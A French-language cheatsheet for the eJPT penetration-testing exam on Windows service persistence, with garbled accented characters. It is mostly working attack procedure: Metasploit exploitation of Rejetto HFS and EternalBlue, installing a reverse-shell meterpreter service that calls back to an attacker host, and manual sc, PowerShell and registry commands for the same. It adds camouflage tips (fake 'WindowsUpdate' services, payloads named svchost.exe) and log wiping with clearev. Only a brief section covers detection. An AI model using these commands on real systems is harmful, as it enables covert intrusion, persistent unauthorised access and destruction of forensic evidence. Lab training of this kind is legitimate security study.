# üîí Windows Service Persistence - Cheatsheet eJPT

## üéØ 1. Vue d'ensemble de la persistence par service

### Concept de base
La **persistence par service Windows** consiste √† :
1. **Cr√©er un service malveillant** qui se lance automatiquement
2. **Maintenir l'acc√®s** m√™me apr√®s reboot/d√©connexion
3. **Survivre aux red√©marrages** du syst√®me
4. **Fonctionner en arri√®re-plan** de mani√®re discr√®te

### Avantages de cette technique
- ‚úÖ **Persistence garantie** apr√®s reboot
- ‚úÖ **Privil√®ges SYSTEM** automatiques
- ‚úÖ **D√©marrage automatique** avec Windows
- ‚úÖ **Difficile √† d√©tecter** pour utilisateur lambda
- ‚úÖ **Compatible** toutes versions Windows

---

## üõ†Ô∏è 2. Exploitation initiale (Rejetto HFS)

### D√©couverte et √©num√©ration
```bash
# 1. Scan de d√©couverte
nmap demo.ine.local

# 2. √ânum√©ration service web
nmap -sV -p 80 demo.ine.local

# 3. Recherche exploits HFS
searchsploit hfs
searchsploit rejetto
```

### Exploitation avec Metasploit
```bash
# 1. Lancer Metasploit
msfconsole -q

# 2. Utiliser exploit Rejetto HFS
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
set LHOST your_kali_ip
show options
exploit

# 3. V√©rifier acc√®s obtenu
getuid
sysinfo
```

**üî• Note :** Rejetto HFS 2.3.x est vuln√©rable √† RCE via injection de commandes dans les param√®tres HTTP.

---

## üîß 3. Module de persistence Metasploit

### Informations sur le module
| Param√®tre | Valeur |
|-----------|--------|
| **Module** | `exploit/windows/local/persistence_service` |
| **Pr√©requis** | Privileges Admin/SYSTEM |
| **Payload d√©faut** | `windows/meterpreter/reverse_tcp` |
| **Port d√©faut** | 4444 |
| **Persistance** | Service Windows |

### Configuration et ex√©cution
```bash
# 1. Mettre session en arri√®re-plan
background

# 2. Charger module de persistence
use exploit/windows/local/persistence_service
show options

# 3. Configuration
set SESSION 1                           # Session Meterpreter active
set LHOST your_kali_ip                  # IP d'√©coute
set LPORT 4444                          # Port d'√©coute (optionnel)
set STARTUP SYSTEM                      # D√©marrage automatique

# 4. Lancer la persistence
exploit
```

### Options avanc√©es du module
| Option | Description | Valeur par d√©faut |
|--------|-------------|-------------------|
| `SESSION` | ID session Meterpreter | Requis |
| `LHOST` | IP attaquant | Auto-d√©tect√© |
| `LPORT` | Port d'√©coute | 4444 |
| `STARTUP` | Type de d√©marrage | SYSTEM |
| `SERVICE_NAME` | Nom du service | Al√©atoire |
| `EXECUTABLE_NAME` | Nom de l'ex√©cutable | Al√©atoire |

---

## üîÑ 4. Workflow complet de persistence

### Phase 1: Exploitation initiale
```bash
# Exploitation Rejetto HFS
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS target
set LHOST attacker_ip
exploit

# V√©rification privil√®ges
getuid                  # Doit √™tre Admin ou SYSTEM
```

### Phase 2: Installation persistence
```bash
# Installation service malveillant
background
use exploit/windows/local/persistence_service
set SESSION 1
exploit

# Le module va :
# - G√©n√©rer un payload
# - L'uploader sur la cible
# - Cr√©er un service Windows
# - Configurer d√©marrage automatique
```

### Phase 3: Test de persistence
```bash
# 1. Configurer handler pour reconnexion
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit -j                              # Job en arri√®re-plan

# 2. Red√©marrer la machine cible (depuis session active)
sessions -i 1
reboot

# 3. Attendre reconnexion automatique
# Le service se lance au boot et √©tablit connexion
```

### Phase 4: Reconnexion apr√®s reboot
```bash
# Handler automatique (d√©j√† en √©coute)
# Session s'√©tablit automatiquement apr√®s boot

# Si pas de session automatique:
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit

# V√©rification session
sessions -l
sessions -i <nouveau_id>
getuid                                  # SYSTEM privileges
```

---

## üéõÔ∏è 5. Gestion manuelle des services Windows

### Commandes sc (Service Control)
```cmd
# Cr√©er service
sc create "WindowsUpdate" binPath= "C:\temp\payload.exe" start= auto

# D√©marrer service
sc start "WindowsUpdate"

# Arr√™ter service
sc stop "WindowsUpdate"

# Supprimer service
sc delete "WindowsUpdate"

# Interroger service
sc query "WindowsUpdate"
sc qc "WindowsUpdate"

# Modifier service existant
sc config "existing_service" binPath= "C:\temp\payload.exe"
```

### PowerShell Service Management
```powershell
# Cr√©er service avec PowerShell
New-Service -Name "WindowsUpdate" -BinaryPathName "C:\temp\payload.exe" -StartupType Automatic

# D√©marrer service
Start-Service "WindowsUpdate"

# Status service
Get-Service "WindowsUpdate"

# Supprimer service
Remove-Service "WindowsUpdate"
```

### Registry Manipulation (alternative)
```cmd
# Ajouter au registry pour d√©marrage auto
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WindowsUpdate" /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\payload.exe"
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WindowsUpdate" /v Start /t REG_DWORD /d 2
```

---

## üîç 6. Techniques de camouflage

### Noms de services l√©gitimes
| Nom sugg√©r√© | Description apparente |
|-------------|----------------------|
| `WindowsUpdate` | Service de mise √† jour |
| `SecurityCenter` | Centre de s√©curit√© |
| `NetworkService` | Service r√©seau |
| `SystemRestore` | Restauration syst√®me |
| `BackupService` | Service de sauvegarde |
| `PrintSpooler2` | Spooler d'impression |
| `AudioDriver` | Pilote audio |

### Emplacements discrets pour payloads
```bash
# Dossiers syst√®me l√©gitimes
C:\Windows\System32\
C:\Windows\SysWOW64\
C:\Program Files\Common Files\
C:\ProgramData\Microsoft\

# Noms de fichiers discrets
svchost.exe (dans dossier custom)
winlogon.exe (dans dossier custom)
explorer.exe (dans dossier custom)
update.exe
```

---

## üõ°Ô∏è 7. D√©tection et contre-mesures

### D√©tection c√¥t√© d√©fenseur
```cmd
# Lister tous les services
sc query type= service state= all

# Services r√©cemment cr√©√©s
wmic service where "PathName like '%temp%'" get Name,PathName
wmic service where "PathName like '%suspicious%'" get Name,PathName

# V√©rifier processus suspects
tasklist /svc
wmic process get ProcessId,Name,ExecutablePath

# Logs Windows Event
# Event ID 7034: Service terminated unexpectedly
# Event ID 7035: Service control manager
```

### Nettoyage des traces
```bash
# Dans Meterpreter
clearev                                 # Clear Event Logs

# Supprimer fichiers
rm /f C:\temp\payload.exe

# Supprimer service
execute -f sc -a "delete malicious_service"
```

---

## üéØ 8. Cas d'usage sp√©cifiques eJPT

### Sc√©nario 1: HFS ‚Üí Service Persistence
```bash
# 1. Exploitation
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS target; set LHOST attacker; exploit

# 2. Persistence
background
use exploit/windows/local/persistence_service
set SESSION 1; exploit

# 3. Test reconnexion
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST attacker; set LPORT 4444; exploit -j
```

### Sc√©nario 2: SMB ‚Üí Service Persistence
```bash
# 1. EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target; set LHOST attacker; exploit

# 2. Persistence service
background
use exploit/windows/local/persistence_service
set SESSION 1; exploit

# 3. V√©rification
sessions -l
# Reboot target et attendre reconnexion
```

### Sc√©nario 3: Web Upload ‚Üí Service Persistence
```bash
# 1. Upload shell PHP
# 2. Handler pour shell
use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp

# 3. Upgrade to meterpreter puis persistence
background
use exploit/windows/local/persistence_service
set SESSION 1; exploit
```

---

## üí° 9. Conseils et astuces eJPT

### Points critiques pour l'exam
- ‚úÖ **Toujours v√©rifier privil√®ges** avant persistence (`getuid`)
- ‚úÖ **Tester la reconnexion** apr√®s reboot
- ‚úÖ **Utiliser handler en arri√®re-plan** (`exploit -j`)
- ‚úÖ **Noter les credentials** du service cr√©√©
- ‚úÖ **Documenter** les artefacts cr√©√©s

### Erreurs courantes √† √©viter
- ‚ùå **Persistence sans privil√®ges Admin**
- ‚ùå **Oublier de tester apr√®s reboot**
- ‚ùå **Handler non configur√©** pour reconnexion
- ‚ùå **Session unique** (pas de backup)
- ‚ùå **Nom de service** trop suspect

### Optimisations eJPT
```bash
# Handler automatique en background
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
set ExitOnSession false
exploit -j

# Multiple handlers pour redondance
set LPORT 4445; exploit -j
set LPORT 4446; exploit -j
```

### Workflow optimis√© examen
```bash
# 1. Exploitation rapide
msfconsole -x "use exploit/windows/http/rejetto_hfs_exec; set RHOSTS target; set LHOST attacker; exploit"

# 2. Persistence imm√©diate
# (dans session Meterpreter)
background
use exploit/windows/local/persistence_service
set SESSION 1
exploit

# 3. Handler backup
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
exploit -j
```

---

## üìã 10. Checklist de persistence r√©ussie

### ‚úÖ Validation √©tape par √©tape
- [ ] **Exploitation initiale** r√©ussie
- [ ] **Privil√®ges Admin/SYSTEM** confirm√©s (`getuid`)
- [ ] **Module persistence** ex√©cut√© sans erreur
- [ ] **Service cr√©√©** visible dans services Windows
- [ ] **Handler configur√©** pour reconnexion
- [ ] **Test reboot** effectu√©
- [ ] **Reconnexion automatique** fonctionnelle
- [ ] **Privil√®ges maintenus** apr√®s reconnexion

### üìù Informations √† documenter
- **Nom du service** cr√©√©
- **Emplacement du payload** sur la cible
- **Port d'√©coute** utilis√©
- **Type de payload** d√©ploy√©
- **M√©thode de nettoyage** si n√©cessaire

**üéØ Conseil final eJPT :** La persistence par service est une technique **fondamentale** dans l'eJPT. Elle garantit l'acc√®s m√™me apr√®s interruptions r√©seau/reboot. Toujours tester la reconnexion apr√®s persistence pour valider le succ√®s !